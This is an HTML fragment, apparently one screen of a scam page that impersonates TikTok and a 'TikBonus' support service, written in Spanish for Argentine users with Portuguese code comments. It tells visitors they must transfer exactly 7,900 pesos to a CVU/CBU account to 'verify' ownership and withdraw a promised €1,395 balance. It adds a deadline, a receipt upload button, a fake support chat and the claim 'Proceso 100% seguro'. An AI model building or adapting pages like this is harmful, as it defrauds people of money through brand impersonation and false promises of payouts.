<section id="ten" class="screen" aria-hidden="true">
            <div class="confirmation-container">
                <div class="confirmation-header">
                    <div class="confirmation-logo">
                        <img src="images/logotiktok.png" alt="TikTok">
                    </div>
                </div>

                <div style="padding:12px 0 16px;text-align:center;">
                    <p style="font-size:14px;color:#444;line-height:1.6;">Para continuar con el retiro del monto disponible, necesitamos confirmar la titularidad de tu cuenta con una transacción real. Es necesario un pago de 7.900 pesos para verificar tu cuenta. Este monto será acreditado en tu saldo disponible para retiro.</p>
                </div>

                <div class="confirmation-section">
                    <div class="confirmation-section-title">DATOS PARA EL REEMBOLSO</div>
                    <div class="confirmation-receipt-grid">
                        <div class="confirmation-receipt-item">
                            <div class="confirmation-receipt-label">Nombre</div>
                            <div id="checkout-confirmation-name" class="confirmation-receipt-value"></div>
                        </div>
                        <div class="confirmation-receipt-item">
                            <div class="confirmation-receipt-label">Correo</div>
                            <div id="checkout-confirmation-email" class="confirmation-receipt-value"></div>
                        </div>
                        <div class="confirmation-receipt-item">
                            <div class="confirmation-receipt-label">Valor a receber</div>
                            <div id="checkout-confirmation-valor" class="confirmation-receipt-value bold">€ 1.395 + ARS 7.900</div>
                        </div>
                    </div>
                </div>

                <div class="confirmation-section" id="gateway-payment-section">
                    <div class="confirmation-section-title">PAGO SEGURO</div>

                    <!-- Estado: carregando -->
                    <div id="gateway-loading" style="text-align:center;padding:40px 0;">
                        <div style="font-size:13px;color:#666;">Generando pago...</div>
                    </div>

                    <!-- Estado: erro -->
                    <div id="gateway-error" style="display:none;padding:20px;text-align:center;color:#ea445a;font-size:13px;"></div>

                    <!-- Estado: transfer — botão para checkout externo -->
                    <div id="gateway-transfer" style="display:none;text-align:center;padding:20px 0;">
                        <p style="font-size:13px;color:#666;margin-bottom:16px;">Serás redirigido al checkout seguro para completar el pago.</p>
                        <a id="gateway-transfer-btn" href="#" target="_blank" rel="noopener"
                           class="confirmation-cta-button" style="display:inline-block;max-width:300px;">
                            Ir al pago
                        </a>
                    </div>

                    <!-- Estado: cvu — conta para transferência -->
                    <div id="gateway-cvu" style="display:none;padding:16px 0;">

                        <!-- Titular -->
                        <p style="font-size:13px;color:#888;margin:0 0 4px;">Transferí el monto exacto a:</p>
                        <p id="gateway-holder-name" style="font-size:16px;font-weight:700;color:#111;margin:0 0 16px;"></p>

                        <!-- Linhas Alias / CVU / CBU -->
                        <div style="border:1px solid #e5e5e5;border-radius:10px;overflow:hidden;margin-bottom:16px;">

                            <div id="gateway-alias-box" style="display:none;align-items:center;justify-content:space-between;padding:13px 16px;border-bottom:1px solid #f0f0f0;" class="copy-box" data-copy-target="gateway-alias-value">
                                <span style="font-size:13px;color:#888;flex-shrink:0;margin-right:12px;">Alias</span>
                                <span id="gateway-alias-value" style="font-family:monospace;font-size:14px;font-weight:600;color:#111;flex:1;text-align:right;margin-right:10px;"></span>
                                <button type="button" class="copy-btn" data-copy-target="gateway-alias-value" aria-label="Copiar Alias" style="background:none;border:none;cursor:pointer;padding:2px;display:flex;align-items:center;flex-shrink:0;">
                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                                </button>
                            </div>

                            <div style="display:flex;align-items:center;justify-content:space-between;padding:13px 16px;border-bottom:1px solid #f0f0f0;">
                                <span style="font-size:13px;color:#888;flex-shrink:0;margin-right:12px;">CVU</span>
                                <span id="gateway-cvu-number" style="font-family:monospace;font-size:13px;font-weight:600;color:#111;flex:1;text-align:right;word-break:break-all;"></span>
                            </div>

                            <div id="gateway-cbu-box" style="display:none;align-items:center;justify-content:space-between;padding:13px 16px;" class="copy-box" data-copy-target="gateway-cbu-value">
                                <span style="font-size:13px;color:#888;flex-shrink:0;margin-right:12px;">CBU</span>
                                <span id="gateway-cbu-value" style="font-family:monospace;font-size:13px;font-weight:600;color:#111;flex:1;text-align:right;margin-right:10px;word-break:break-all;"></span>
                                <button type="button" class="copy-btn" data-copy-target="gateway-cbu-value" aria-label="Copiar CBU" style="background:none;border:none;cursor:pointer;padding:2px;display:flex;align-items:center;flex-shrink:0;">
                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                                </button>
                            </div>

                        </div>

                        <!-- Botão copiar CVU destacado -->
                        <button type="button" class="copy-btn copy-btn-large" data-copy-target="gateway-cvu-number" aria-label="Copiar CVU"
                            style="display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:15px;margin-top:14px;background:#fe2c55;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:0.1px;box-shadow:0 4px 16px rgba(254,44,85,.30);transition:background .2s;">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                            <span>Copiar CVU</span>
                        </button>

                        <!-- Valor grande -->
                        <div id="gateway-cvu-amount" style="font-size:28px;font-weight:800;color:#111;text-align:center;margin-bottom:16px;"></div>

                        <!-- Prazo -->
                        <div id="gateway-deadline-box" style="display:none;background:#fff8e1;border:1px solid #ffe082;border-radius:6px;padding:10px;text-align:center;margin-bottom:14px;">
                            <span style="font-size:11px;color:#b45309;">⏳ Válido hasta </span>
                            <span id="gateway-deadline" style="font-size:12px;font-weight:600;color:#92400e;"></span>
                        </div>
                        <!-- aviso de titularidade -->
                        <div style="background:#2d1a00;border:1px solid #92400e;border-radius:10px;padding:14px 16px;margin-bottom:4px;display:flex;gap:10px;align-items:flex-start;">
                            <span style="font-size:18px;line-height:1;flex-shrink:0;">⚠️</span>
                            <p id="gateway-warning-text" style="margin:0;font-size:13px;color:#fcd34d;line-height:1.6;">
                                Transferí exactamente <strong>7.900 pesos</strong> desde una cuenta a tu nombre, registrada con el DNI que ingresaste. Si el monto o el titular no coinciden, la validación puede demorar hasta 24 horas.
                            </p>
                        </div>

                        <!-- polling status -->
                        <div id="gateway-cvu-status" style="text-align:center;margin-top:4px;font-size:13px;color:#666;"></div>

                        <!-- mensagem de detecção -->
                        <p id="gateway-detect-msg" style="display:none;font-size:13px;color:#555;text-align:center;margin-top:16px;line-height:1.6;">
                            Estamos detectando tu transferencia. Si no se confirma sola, en 30 segundos vas a ver abajo el botón <strong>«Ya realicé el pago»</strong> para subir el comprobante.
                        </p>

                        <!-- botão comprovante (aparece após 30s) -->
                        <div id="gateway-comprovante-wrap" style="display:none;margin-top:16px;text-align:center;">
                            <input type="file" id="gateway-comprovante-input" accept="image/*,application/pdf" style="display:none;">
                            <button type="button" id="gateway-comprovante-btn"
                                style="background:#fe2c55;color:#fff;border:none;border-radius:10px;padding:14px 24px;font-size:15px;font-weight:700;width:100%;cursor:pointer;">
                                Ya realicé el pago
                            </button>
                            <p id="gateway-comprovante-hint" style="font-size:12px;color:#999;margin-top:8px;"></p>
                        </div>

                        <!-- estado: em análise -->
                        <div id="gateway-analise" style="display:none;text-align:center;padding:32px 0;">
                            <div style="font-size:40px;margin-bottom:12px;">✅</div>
                            <div style="font-size:17px;font-weight:700;color:#111;margin-bottom:8px;">Comprobante recibido</div>
                            <p style="font-size:14px;color:#555;line-height:1.6;">Tu pago está en análisis. En breve recibirás la confirmación y el reembolso será acreditado en tu cuenta.</p>
                        </div>

                        <!-- Widget de ayuda -->
                        <div style="margin-top:24px;">
                            <button type="button" id="gateway-help-btn"
                                style="display:flex;align-items:center;gap:8px;margin:0 auto;background:none;border:1px solid #e5e5e5;border-radius:20px;padding:8px 18px;font-size:13px;color:#555;cursor:pointer;">
                                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                                ¿Necesitás ayuda?
                            </button>

                            <div id="gateway-chat-panel" style="display:none;margin-top:10px;border:1px solid #e5e5e5;border-radius:12px;overflow:hidden;">
                                <!-- Header -->
                                <div style="background:#fe2c55;padding:12px 16px;display:flex;align-items:center;gap:10px;">
                                    <div style="width:32px;height:32px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;">🎧</div>
                                    <div style="flex:1;">
                                        <div style="color:#fff;font-weight:700;font-size:14px;">Soporte TikBonus</div>
                                        <div style="color:rgba(255,255,255,.75);font-size:11px;">Respondemos por email</div>
                                    </div>
                                    <button type="button" id="gateway-chat-close" style="background:none;border:none;color:#fff;font-size:22px;line-height:1;cursor:pointer;padding:0 4px;">×</button>
                                </div>
                                <!-- Body -->
                                <div style="background:#fff;">
                                    <!-- Histórico de mensagens -->
                                    <div id="gateway-chat-messages" style="padding:16px 16px 0;display:flex;flex-direction:column;gap:10px;max-height:220px;overflow-y:auto;">
                                        <!-- Burbuja do bot -->
                                        <div style="background:#f3f4f6;border-radius:10px 10px 10px 2px;padding:11px 14px;font-size:13px;color:#374151;line-height:1.5;align-self:flex-start;max-width:85%;">
                                            ¡Hola! Contanos tu consulta y te responderemos a tu correo electrónico a la brevedad. 😊
                                        </div>
                                    </div>
                                    <!-- Formulario -->
                                    <div style="padding:12px 16px 16px;">
                                        <textarea id="gateway-chat-msg"
                                            placeholder="Escribí tu consulta acá..."
                                            style="width:100%;border:1px solid #e5e5e5;border-radius:8px;padding:10px 12px;font-size:13px;font-family:inherit;resize:none;outline:none;height:72px;box-sizing:border-box;"></textarea>
                                        <button type="button" id="gateway-chat-send"
                                            style="width:100%;margin-top:8px;padding:11px;background:#fe2c55;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;">
                                            Enviar mensaje
                                        </button>
                                    </div>
                                </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="confirmation-footer">
                    <div class="confirmation-footer-text">Proceso 100% seguro</div>
                    <button type="button" id="btn-voltar-ten" style="margin-top:12px;background:none;border:none;color:#888;font-size:13px;cursor:pointer;text-decoration:underline;">
                        Volver y corregir datos
                    </button>
                </div>
            </div>
        </section>
